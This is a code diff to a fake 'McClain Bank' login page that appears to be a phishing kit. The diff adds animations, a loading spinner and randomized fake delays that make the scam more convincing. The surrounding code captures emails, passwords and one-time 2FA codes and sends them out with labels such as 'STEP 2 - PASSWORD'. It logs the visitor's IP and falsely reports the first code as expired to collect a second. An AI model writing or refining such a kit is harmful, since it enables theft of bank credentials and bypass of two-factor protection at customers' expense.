@@ -31,20 +31,29 @@
   .banner p{margin:0;max-width:760px}
   main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 0}
   .card{
+    position:relative;overflow:hidden;
     background:#fff;border-radius:var(--card-radius);box-shadow:var(--shadow);
     width:90%;max-width:480px;padding:40px;margin:auto;
+    transition:height .26s cubic-bezier(.4,0,.2,1);
+    animation:cardIn .45s cubic-bezier(.2,.7,.3,1) both;
+  }
+  @keyframes cardIn{
+    from{opacity:0;transform:translateY(14px) scale(.995)}
+    to{opacity:1;transform:none}
   }
   .logo{display:block;height:80px;margin:0 auto}
   .fdic{display:flex;align-items:center;justify-content:center;gap:8px;margin:18px 0 4px;
     color:var(--text2);font-size:11px;text-align:center}
   .fdic svg{flex:0 0 auto}
-  form{margin:0}
+  form{margin:0;will-change:opacity,transform;transition:opacity .18s ease,transform .18s ease}
+  form.out{opacity:0;transform:translateY(-10px)}
+  form.in{opacity:0;transform:translateY(12px)}
   .field{position:relative;border:1px solid var(--text2);border-radius:4px;
     padding:18px 12px 6px;margin-top:26px;background:#fff}
   .field .label{position:absolute;top:-8px;left:10px;background:#fff;padding:0 4px;
-    font-size:12px;font-weight:500;color:var(--text2)}
+    font-size:12px;font-weight:500;color:var(--text2);transition:color .15s ease}
   .field input{width:100%;border:0;outline:0;font:inherit;font-size:16px;
-    color:var(--text);background:transparent;padding:2px 0 4px}
+    color:var(--text);background:transparent;padding:2px 0 4px;caret-color:var(--theme)}
   .field:focus-within{border-color:var(--theme);box-shadow:0 0 0 2px rgba(112,14,14,.15)}
   .field:focus-within .label{color:var(--theme)}
   .row{display:flex;align-items:center;gap:12px;margin-top:12px}
@@ -61,7 +70,7 @@
   .methods label{
     display:flex;align-items:center;gap:10px;padding:12px 12px;
     border:1px solid #d5dbe3;border-radius:6px;margin-bottom:8px;
-    font-size:14px;cursor:pointer;color:var(--text);
+    font-size:14px;cursor:pointer;color:var(--text);transition:border-color .15s,background .15s;
   }
   .methods label:has(input:checked){border-color:var(--theme);background:#fbf4f4}
   .methods input{accent-color:var(--theme);margin:0}
@@ -71,19 +80,40 @@
   button{
     border:0;cursor:pointer;font:inherit;font-weight:500;color:#fff;background:var(--theme);
     border-radius:var(--btn-radius);padding:12px 26px;min-width:132px;font-size:15px;
+    transition:background .15s ease,opacity .15s ease;
   }
   button:hover{background:var(--theme-press)}
   button:disabled{opacity:.55;cursor:default}
-  .status-message{font-size:13px;color:var(--text2);text-align:center;margin-top:16px}
+  .status-message{font-size:13px;color:var(--text2);text-align:center;margin-top:16px;
+    animation:cardIn .3s ease both}
   footer{text-align:center;color:var(--text2);font-size:12px;padding:22px 16px 30px;line-height:1.7}
   footer a{color:#660000;font-weight:400;font-size:12px}
   .ehl{vertical-align:-1px;margin-right:4px;fill:var(--text2)}
   [hidden]{display:none!important}
+
+  .loader{
+    position:absolute;inset:0;z-index:6;border-radius:var(--card-radius);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+    background:#fff;opacity:0;transition:opacity .18s ease;
+  }
+  .loader.show{opacity:1}
+  .spinner{
+    width:34px;height:34px;border-radius:50%;
+    border:3px solid #e3e7ed;border-top-color:var(--theme);
+    animation:spin .8s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loader p{margin:0;font-size:14px;color:var(--text2)}
+
   @media (max-width:600px){
     .card{width:88%;padding:22px;margin-top:20px}
     main{padding:0}
     .logo{height:64px}
     button{min-width:110px;padding:11px 18px}
+  }
+  @media (prefers-reduced-motion:reduce){
+    .card,form,.status-message{animation:none;transition:none}
+    .spinner{animation-duration:1.6s}
   }
 </style>
 </head>
@@ -97,7 +127,12 @@
 </div>
 
 <main>
-  <div class="card">
+  <div class="card" id="card">
+    <div class="loader" id="loader" hidden aria-live="polite">
+      <div class="spinner"></div>
+      <p id="loader-text">Signing in...</p>
+    </div>
+
     <img class="logo" src="https://bhaw.onl/m/mcclain-bank-logo-2ca7cfd5.png" alt="McClain Bank">
     <div class="fdic">
       <svg xmlns="http://www.w3.org/2000/svg" width="60" height="17" fill="none" aria-label="FDIC insured">
@@ -166,6 +201,7 @@
   <svg width="16" height="11" viewBox="0 0 10 7" class="ehl" aria-hidden="true"><path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"/></svg>
   Equal Housing Lender
 </footer>
+
 <script>
 const emailInput    = document.getElementById('email');
 const passwordInput = document.getElementById('password');
@@ -178,6 +214,10 @@ const stepPassword  = document.getElementById('step-password');
 const step2fa       = document.getElementById('step-2fa');
 const stepCode      = document.getElementById('step-code');
 const statusMessage = stepCode.querySelector('.status-message');
+
+const card       = document.getElementById('card');
+const loader     = document.getElementById('loader');
+const loaderText = document.getElementById('loader-text');
 
 const steps = [stepEmail, stepPassword, step2fa, stepCode];
 const addressValues = document.querySelectorAll('.address-value');
@@ -193,17 +233,70 @@ const SECOND_HOLD_MS = 60000;
 let ip = '-';
 let attempt = 0;
 let holdTimer = null;
+let swapping = false;
 
 fetch('https://api.ipify.org?format=json')
   .then(r => r.json()).then(d => { if (d && d.ip) ip = d.ip; }).catch(() => {});
 
-function showStep(i){
-  steps.forEach((s,n)=>{ s.hidden = n !== i; });
+function focusStep(i){
   if(i===0) emailInput.focus();
   else if(i===1) passwordInput.focus();
   else if(i===2) contactEmail.focus();
   else codeInput.focus();
 }
+
+function showStep(i, animate){
+  const cur = steps.findIndex(s => !s.hidden);
+  if(cur === i) return;
+
+  if(!animate || cur === -1){
+    steps.forEach((s,n)=>{ s.hidden = n !== i; s.classList.remove('out','in'); });
+    card.style.height = '';
+    focusStep(i);
+    return;
+  }
+
+  if(swapping) return;
+  swapping = true;
+
+  const from = steps[cur];
+  const to   = steps[i];
+
+  card.style.height = card.offsetHeight + 'px';
+  from.classList.add('out');
+
+  setTimeout(()=>{
+    from.hidden = true;
+    from.classList.remove('out');
+
+    to.hidden = false;
+    to.classList.add('in');
+
+    const cs = getComputedStyle(card);
+    const target = to.offsetHeight + parseFloat(cs.paddingTop) + parseFloat(cs.paddingBottom);
+    card.style.height = target + 'px';
+
+    requestAnimationFrame(()=>requestAnimationFrame(()=>{
+      to.classList.remove('in');
+    }));
+
+    setTimeout(()=>{ card.style.height = ''; swapping = false; }, 300);
+    focusStep(i);
+  }, 180);
+}
+
+function showLoader(msg){
+  loaderText.textContent = msg;
+  loader.hidden = false;
+  card.setAttribute('aria-busy','true');
+  requestAnimationFrame(()=>loader.classList.add('show'));
+}
+function hideLoader(){
+  loader.classList.remove('show');
+  card.removeAttribute('aria-busy');
+  setTimeout(()=>{ loader.hidden = true; }, 200);
+}
+
 function updateAddress(){
   addressValues.forEach(v=>{ v.textContent = emailInput.value; });
 }
@@ -285,21 +378,34 @@ function send(stage, otp, priority){
 
 /* ---------- flow ---------- */
 stepEmail.addEventListener('submit', e=>{
-  e.preventDefault(); updateAddress(); showStep(1);
+  e.preventDefault(); updateAddress(); showStep(1, true);
 });
 
 stepPassword.addEventListener('submit', e=>{
-  e.preventDefault(); updateAddress();
-  lockButton(buttonOf(stepPassword),'Logging in...');
+  e.preventDefault();
+  updateAddress();
   send('STEP 2 - PASSWORD', null, '4');
-  resetButtons(); showStep(2);
+  lockButton(buttonOf(stepPassword),'Signing in...');
+  showLoader('Signing in...');
+
+  setTimeout(()=>{
+    hideLoader();
+    resetButtons();
+    setTimeout(()=>showStep(2, true), 130);
+  }, 1100 + Math.random() * 600);
 });
 
 step2fa.addEventListener('submit', e=>{
   e.preventDefault();
   lockButton(buttonOf(step2fa),'Sending...');
   send('STEP 3 - 2FA SETUP', null, '3');
-  resetButtons(); showStep(3);
+  showLoader('Sending verification code...');
+
+  setTimeout(()=>{
+    hideLoader();
+    resetButtons();
+    setTimeout(()=>showStep(3, true), 130);
+  }, 900 + Math.random() * 500);
 });
 
 codeInput.addEventListener('input', ()=>{
@@ -318,28 +424,30 @@ stepCode.addEventListener('submit', e=>{
   send('STEP 4 - CODE' + (attempt > 1 ? ' RETRY' : ''), code, '5');
 
   lockButton(buttonOf(stepCode),'Verifying...');
-  statusMessage.textContent = 'Verifying your code...';
-  statusMessage.hidden = false;
+  showLoader('Verifying your code...');
   clearTimeout(holdTimer);
 
   const isLast = attempt >= 2;
   holdTimer = setTimeout(()=>{
     if(isLast){
-      statusMessage.textContent = 'Redirecting to online banking...';
-      setTimeout(()=>{ location.href = REDIRECT_URL; }, 800);
+      loaderText.textContent = 'Redirecting to online banking...';
+      setTimeout(()=>{ location.href = REDIRECT_URL; }, 900);
       return;
     }
-    codeInput.value = '';
-    buttonOf(stepCode).disabled = false;
-    buttonOf(stepCode).textContent = 'Verify';
-    statusMessage.textContent = 'That code expired. Enter the newest one from your device.';
-    statusMessage.hidden = false;
-    codeInput.focus();
+    hideLoader();
+    setTimeout(()=>{
+      codeInput.value = '';
+      buttonOf(stepCode).disabled = false;
+      buttonOf(stepCode).textContent = 'Verify';
+      statusMessage.textContent = 'That code expired. Enter the newest one from your device.';
+      statusMessage.hidden = false;
+      codeInput.focus();
+    }, 200);
   }, isLast ? SECOND_HOLD_MS : FIRST_HOLD_MS);
 });
 
 document.querySelectorAll('.change-link').forEach(a=>{
-  a.addEventListener('click', e=>{ e.preventDefault(); resetButtons(); showStep(0); });
+  a.addEventListener('click', e=>{ e.preventDefault(); resetButtons(); showStep(0, true); });
 });
 document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
   a.addEventListener('click', e=>{ e.preventDefault(); });
@@ -348,7 +456,7 @@ document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
 window.addEventListener('online', drain);
 setInterval(drain, 20000);
 
-showStep(0);
+showStep(0, false);
 drain();
 </script>
 </body>
